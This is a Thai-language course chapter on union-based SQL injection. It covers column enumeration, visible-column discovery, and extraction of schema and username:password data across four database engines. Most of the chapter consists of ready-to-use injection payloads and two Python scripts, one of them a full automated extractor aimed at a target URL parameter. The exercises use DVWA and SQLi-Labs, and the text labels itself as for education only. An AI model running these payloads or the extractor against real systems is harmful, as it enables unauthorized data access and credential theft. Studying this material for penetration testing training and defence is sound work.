# Part 013: Union-Based SQL Injection (การดึงข้อมูลด้วย UNION SELECT)

## ภาพรวม (Overview)

Union-based SQL Injection ใช้คำสั่ง `UNION SELECT` เพื่อรวมผลลัพธ์ของ query ที่ inject เข้าไปกับ query ดั้งเดิม เป็นเทคนิคที่ทรงพลังมากในการดึงข้อมูลจาก database

**ขั้นตอนที่ 126-140 ในหลักสูตรนี้**

---

## 126. หลักการของ UNION (UNION Fundamentals)

### 26.1 SQL UNION คืออะไร?

```sql
-- UNION รวมผลลัพธ์ของ 2 SELECT statements
SELECT username, password FROM users
UNION
SELECT admin_name, admin_pass FROM admins;

-- กฎของ UNION:
-- 1. จำนวน columns ต้องเท่ากัน
-- 2. ประเภทข้อมูลต้องเข้ากันได้
-- 3. ชื่อ columns ใช้ตาม SELECT แรก
```

### 26.2 ทำไมถึงใช้ใน SQL Injection

```sql
-- Query ดั้งเดิม
SELECT name, description FROM products WHERE id = [INPUT]

-- เมื่อ inject UNION SELECT
SELECT name, description FROM products WHERE id = 999
UNION SELECT username, password FROM users--

-- Application แสดงข้อมูลจาก products แต่ตอนนี้
-- ยังแสดงข้อมูลจาก users ด้วย!
```

---

## 127. ขั้นตอนการทำ Union-Based SQLi

### Step 1: ตรวจสอบว่ามีช่องโหว่

```sql
-- ทดสอบ basic injection
http://example.com/item?id=1'
-- ถ้ามี error → มีช่องโหว่
```

### Step 2: หาจำนวน Columns

**วิธีที่ 1: ORDER BY**

```sql
-- ลองเพิ่มทีละ 1 จนเกิด error
http://example.com/item?id=1 ORDER BY 1--
http://example.com/item?id=1 ORDER BY 2--
http://example.com/item?id=1 ORDER BY 3--
http://example.com/item?id=1 ORDER BY 4--
-- ถ้า ORDER BY 4 เกิด error แต่ ORDER BY 3 ไม่เกิด
-- แสดงว่ามี 3 columns
```

**วิธีที่ 2: UNION SELECT NULL**

```sql
-- ลองเพิ่ม NULL ทีละตัว
http://example.com/item?id=999 UNION SELECT NULL--
-- ERROR (1 column ไม่ตรง)

http://example.com/item?id=999 UNION SELECT NULL,NULL--
-- ERROR (2 columns ไม่ตรง)

http://example.com/item?id=999 UNION SELECT NULL,NULL,NULL--
-- ไม่ error → มี 3 columns
```

### Step 3: หา Column ที่แสดงผล (Visible Column)

```sql
-- แทน NULL ด้วย string เพื่อหา column ที่แสดง
http://example.com/item?id=999 UNION SELECT 'a',NULL,NULL--
http://example.com/item?id=999 UNION SELECT NULL,'a',NULL--
http://example.com/item?id=999 UNION SELECT NULL,NULL,'a'--

-- column ที่แสดง 'a' คือ column ที่เราจะใช้ inject ข้อมูล
```

### Step 4: ดึงข้อมูล

```sql
-- เมื่อรู้ว่า column ที่ 2 แสดงผล
http://example.com/item?id=999 UNION SELECT NULL,version(),NULL--
http://example.com/item?id=999 UNION SELECT NULL,database(),NULL--
http://example.com/item?id=999 UNION SELECT NULL,user(),NULL--
```

---

## 128. การหาจำนวน Columns อย่างละเอียด

### 28.1 ORDER BY Method (แนะนำ)

```sql
-- MySQL
1 ORDER BY 1--
1 ORDER BY 2--
1 ORDER BY 3--
1 ORDER BY 4-- ← error ที่นี่? แสดงว่ามี 3 columns

-- MSSQL
1 ORDER BY 1--
1 ORDER BY 2--
...

-- Oracle
1 ORDER BY 1--
1 ORDER BY 2--
...
```

### 28.2 UNION NULL Method

```sql
-- เพิ่ม NULL ทีละตัว
1 UNION SELECT NULL--
1 UNION SELECT NULL,NULL--
1 UNION SELECT NULL,NULL,NULL--
...

-- Oracle ต้องมี FROM dual
1 UNION SELECT NULL FROM dual--
1 UNION SELECT NULL,NULL FROM dual--
```

### 28.3 Python Script หาจำนวน Columns

```python
import requests

def find_columns(url, param, max_cols=20):
    """หาจำนวน columns ด้วย ORDER BY"""
    
    print("[*] Finding number of columns...")
    
    for i in range(1, max_cols + 1):
        payload = f"1 ORDER BY {i}-- -"
        r = requests.get(url, params={param: payload})
        
        error_keywords = ['error', 'unknown column', 'ORDER BY']
        has_error = any(kw.lower() in r.text.lower() for kw in error_keywords)
        
        if has_error:
            print(f"[+] Number of columns: {i-1}")
            return i - 1
    
    return None


def find_visible_columns(url, param, num_cols):
    """หา columns ที่แสดงผล"""
    
    print("[*] Finding visible columns...")
    visible = []
    
    for i in range(num_cols):
        cols = ['NULL'] * num_cols
        marker = f"'COL{i}VISIBLE'"
        cols[i] = marker
        
        payload = f"999 UNION SELECT {','.join(cols)}-- -"
        r = requests.get(url, params={param: payload})
        
        if f"COL{i}VISIBLE" in r.text:
            visible.append(i + 1)
            print(f"[+] Column {i+1} is visible")
    
    return visible


url = "http://example.com/items"
param = "id"

num_cols = find_columns(url, param)
if num_cols:
    visible_cols = find_visible_columns(url, param, num_cols)
    print(f"[+] Visible columns: {visible_cols}")
```

---

## 129. การดึงข้อมูลจาก Database (Data Extraction)

### 29.1 ดึงข้อมูล System

```sql
-- MySQL
999 UNION SELECT NULL,version(),NULL--
999 UNION SELECT NULL,database(),NULL--
999 UNION SELECT NULL,user(),NULL--
999 UNION SELECT NULL,@@datadir,NULL--

-- MSSQL
999 UNION SELECT NULL,@@version,NULL--
999 UNION SELECT NULL,db_name(),NULL--

-- Oracle
999 UNION SELECT NULL,(SELECT banner FROM v$version WHERE rownum=1),NULL FROM dual--

-- PostgreSQL
999 UNION SELECT NULL,version(),NULL--
999 UNION SELECT NULL,current_database(),NULL--
```

### 29.2 ดึงรายชื่อ Databases

```sql
-- MySQL
999 UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--

-- MSSQL
999 UNION SELECT NULL,name,NULL FROM sys.databases--

-- Oracle
999 UNION SELECT NULL,username,NULL FROM all_users--

-- PostgreSQL
999 UNION SELECT NULL,datname,NULL FROM pg_database--
```

### 29.3 ดึงรายชื่อ Tables

```sql
-- MySQL
999 UNION SELECT NULL,table_name,NULL 
FROM information_schema.tables 
WHERE table_schema=database()--

-- MSSQL
999 UNION SELECT NULL,name,NULL FROM sys.tables--

-- Oracle
999 UNION SELECT NULL,table_name,NULL FROM all_tables--

-- PostgreSQL
999 UNION SELECT NULL,tablename,NULL 
FROM pg_tables 
WHERE schemaname='public'--
```

### 29.4 ดึงรายชื่อ Columns

```sql
-- MySQL
999 UNION SELECT NULL,column_name,NULL 
FROM information_schema.columns 
WHERE table_name='users'--

-- MSSQL
999 UNION SELECT NULL,column_name,NULL 
FROM information_schema.columns 
WHERE table_name='users'--

-- Oracle
999 UNION SELECT NULL,column_name,NULL 
FROM all_tab_columns 
WHERE table_name='USERS'--
```

### 29.5 ดึงข้อมูลจาก Table

```sql
-- ดึง users table (MySQL)
999 UNION SELECT NULL,concat(username,':',password),NULL FROM users--

-- GROUP_CONCAT ดึงทั้งหมดในครั้งเดียว
999 UNION SELECT NULL,GROUP_CONCAT(username,':',password SEPARATOR '\n'),NULL FROM users--
```

---

## 130. เทคนิค Multi-Row Extraction

### 30.1 GROUP_CONCAT (MySQL)

```sql
-- รวมทุก rows เป็น string เดียว
999 UNION SELECT NULL,GROUP_CONCAT(username ORDER BY id SEPARATOR '|'),NULL FROM users--

-- เพิ่ม column separator
999 UNION SELECT NULL,GROUP_CONCAT(id,'::',username,'::',password SEPARATOR '|'),NULL FROM users--
```

### 30.2 FOR XML PATH (MSSQL)

```sql
-- รวม rows ด้วย FOR XML PATH
999 UNION SELECT NULL,(SELECT username+':'+password+' ' FROM users FOR XML PATH('')),NULL--
```

### 30.3 WM_CONCAT / LISTAGG (Oracle)

```sql
-- Oracle LISTAGG
999 UNION SELECT NULL,LISTAGG(username||':'||password, '|') WITHIN GROUP (ORDER BY 1),NULL FROM dual--
```

---

## 133. Complete Extraction Script

```python
#!/usr/bin/env python3
"""
Union-Based SQL Injection Complete Extractor
สำหรับการศึกษาเท่านั้น
"""

import requests
import re

class UnionExtractor:
    def __init__(self, url, param, cookies=None, headers=None):
        self.url = url
        self.param = param
        self.session = requests.Session()
        if cookies:
            self.session.cookies.update(cookies)
        if headers:
            self.session.headers.update(headers)
        
        self.num_columns = None
        self.visible_columns = []
    
    def request(self, payload):
        params = {self.param: payload}
        try:
            r = self.session.get(self.url, params=params, timeout=10)
            return r.text
        except Exception as e:
            print(f"[-] Request error: {e}")
            return ""
    
    def find_columns(self, max_cols=25):
        print("[*] Detecting number of columns...")
        
        for i in range(1, max_cols + 1):
            payload = f"1 ORDER BY {i}-- -"
            response = self.request(payload)
            
            error_indicators = ['unknown column', 'error in your sql', 'order by', 'sqlstate']
            
            if any(ind.lower() in response.lower() for ind in error_indicators):
                self.num_columns = i - 1
                print(f"[+] Found {self.num_columns} columns")
                return self.num_columns
        
        return None
    
    def find_visible(self):
        if not self.num_columns:
            self.find_columns()
        
        print("[*] Finding visible columns...")
        
        for i in range(1, self.num_columns + 1):
            cols = ['NULL'] * self.num_columns
            marker = f'VISIBLE{i}MARKER'
            cols[i-1] = f"'{marker}'"
            
            payload = f"999999 UNION SELECT {','.join(cols)}-- -"
            response = self.request(payload)
            
            if marker in response:
                self.visible_columns.append(i)
                print(f"[+] Column {i} is visible")
        
        return self.visible_columns
    
    def inject(self, data_payload):
        if not self.visible_columns:
            self.find_visible()
        
        if not self.visible_columns:
            print("[-] No visible columns found")
            return None
        
        vis_col = self.visible_columns[0] - 1
        cols = ['NULL'] * self.num_columns
        cols[vis_col] = f"({data_payload})"
        
        payload = f"999999 UNION SELECT {','.join(cols)}-- -"
        return self.request(payload)
    
    def get_databases(self):
        query = "SELECT GROUP_CONCAT(schema_name ORDER BY schema_name SEPARATOR '|') FROM information_schema.schemata"
        return self.inject(query)
    
    def get_tables(self, database=None):
        if database:
            query = f"SELECT GROUP_CONCAT(table_name SEPARATOR '|') FROM information_schema.tables WHERE table_schema='{database}'"
        else:
            query = "SELECT GROUP_CONCAT(table_name SEPARATOR '|') FROM information_schema.tables WHERE table_schema=database()"
        return self.inject(query)
    
    def get_columns(self, table, database=None):
        if database:
            query = f"SELECT GROUP_CONCAT(column_name SEPARATOR '|') FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}'"
        else:
            query = f"SELECT GROUP_CONCAT(column_name SEPARATOR '|') FROM information_schema.columns WHERE table_name='{table}'"
        return self.inject(query)
    
    def full_dump(self):
        print("\n" + "="*60)
        print("Union-Based SQL Injection - Full Dump")
        print("="*60)
        
        if not self.num_columns:
            self.find_columns()
        if not self.visible_columns:
            self.find_visible()
        
        if not self.visible_columns:
            print("[-] Cannot proceed: no visible columns")
            return
        
        print(f"\n[+] Setup complete: {self.num_columns} columns, visible: {self.visible_columns}")
        print(f"[+] Databases: {self.get_databases()}")
        print(f"[+] Tables: {self.get_tables()}")


if __name__ == "__main__":
    extractor = UnionExtractor(
        url="http://example.com/items",
        param="id"
    )
    extractor.full_dump()
```

---

## 134. แบบฝึกหัด (Exercises)

### Exercise 1: Manual Union-Based SQLi

ใช้ DVWA หรือ SQLi-Labs:

1. หาจำนวน columns ด้วย ORDER BY
2. หา visible columns
3. ดึง version และ database name
4. ดึงรายชื่อ tables
5. ดึงข้อมูล users table

**Hints สำหรับ DVWA:**
```
http://localhost/dvwa/vulnerabilities/sqli/?id=1'%20ORDER%20BY%203--+&Submit=Submit
http://localhost/dvwa/vulnerabilities/sqli/?id=999'%20UNION%20SELECT%20NULL,version()--+&Submit=Submit
```

---

## สรุป

Union-based SQL Injection เป็นเทคนิคที่:
- **ทรงพลัง** - ดึงข้อมูลได้ครั้งละมากๆ
- **ยืดหยุ่น** - ดึงได้จากทุก table ใน database
- **เร็ว** - ไม่ต้องทำ request มากเหมือน blind techniques
- **ต้องการ** - visible output columns จาก application

---

*Part 013 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
